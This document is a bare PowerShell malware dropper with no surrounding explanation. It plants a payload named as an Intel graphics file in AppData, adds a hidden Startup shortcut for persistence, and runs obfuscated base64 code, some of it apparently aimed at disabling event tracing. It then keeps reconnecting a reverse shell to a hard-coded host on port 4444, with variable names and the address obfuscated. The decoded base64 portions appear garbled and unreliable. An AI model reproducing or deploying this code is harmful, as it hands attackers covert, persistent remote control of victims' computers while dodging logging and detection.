$startupPath = "$env:APPDATA\IntelGraphics.ps1"
$PayloadContent = @'
function OiHfsRCr {
    IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RnVuY3Rpb24gRGlzYWJsZS1FVFcgKGdldC1tb2R1bGUgLU5hbWUgTlRERExMKS5FY3Rpb25DbGFzczpEaXNhYmxlRVROb3RpZmljYXRpb24oW1JlZl0uQXNzZW1ibHkuR2V0V3JpdGVyKCkp')));
    IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U1RBUlQtU0xFRVAgMTsgJHdpbnZhciA9IFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpnZXRfRXhwaXJlZEVudmFsdWVzKCk7IGlmICgkd2ludmFyLmNvdW50ID4gMCkgewoJICAgIGZvcigheD0wOyB4IC1sdCAkd2ludmFyLmNvdW50OyB4KyspIHsKCQkgICAJCWlmICgkd2ludmFyW3hdIC1saWtlICcqXGVuYyAqJykgewoJCQkgCQkJCiAgICAgICAgICAgICRjbWQgPSAkd2ludmFyW3hdLnNwbGl0KCdAXCcsIDIpWzFdCiAgICAgICAgICAgIAkkZW5jID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QXNjaWkuR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGNtZCkpCiAgICAgICAgICAgIAkkaWV4ID0gSUVYICRlbmMKCQkJCQkJfQoJCQkJfQoJfQ==')));
    while ($true) {
        try {
            $ErrorActionPreference = "Stop"
            $PJTUEe = New-Object System.Net.Sockets.TCPClient([System.Text.Encoding]::UTF8.GetString([byte[]](0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x30,0x2e,0x31,0x30,0x38)), 4444)
            $VvFnhHZ = $PJTUEe.GetStream()
            [byte[]]$gxZmLQScrd = 0..65535|%{0}
            $PhmxlrOP = (New-Object System.Text.ASCIIEncoding).GetBytes(("P"+"S" + " " + (Get-Location).Path + "> "))
            $VvFnhHZ.Write($PhmxlrOP,0,$PhmxlrOP.Length)
            while (($fMjIcwX = $VvFnhHZ.Read($gxZmLQScrd, 0, $gxZmLQScrd.Length)) -ne 0) {
                $AQocPd = (New-Object System.Text.ASCIIEncoding).GetString($gxZmLQScrd, 0, $fMjIcwX)
                $UaBkeZNye = (IEX $AQocPd 2>&1 | Out-String)
                $IpgFr = $UaBkeZNye + ("P"+"S" + " " + (Get-Location).Path + "> ")
                $PhmxlrOP = (New-Object System.Text.ASCIIEncoding).GetBytes($IpgFr)
                $VvFnhHZ.Write($PhmxlrOP,0,$PhmxlrOP.Length)
                $VvFnhHZ.Flush()
            }
            $PJTUEe.Close()
        }
        catch { Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 20) }
    }
}
Set-Variable -Name 'fwHvXm' -Value ('OiHf'+'sRCr'); & (Get-Variable -Name fwHvXm -ValueOnly)
'@
Set-Content -Path $startupPath -Value $PayloadContent -Encoding ascii
$s=New-Object -ComObject WScript.Shell;$p="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\IntelGraphics.lnk";$sc=$s.CreateShortcut($p);$sc.TargetPath="powershell.exe";$sc.Arguments="-NoP -Ex Bypass -Win Hidden -File `"$env:APPDATA\IntelGraphics.ps1`"";$sc.Save()
Start-Process powershell.exe -Arg "-NoP -Ex Bypass -Win Hidden -File `"$startupPath`"" -Win Hidden
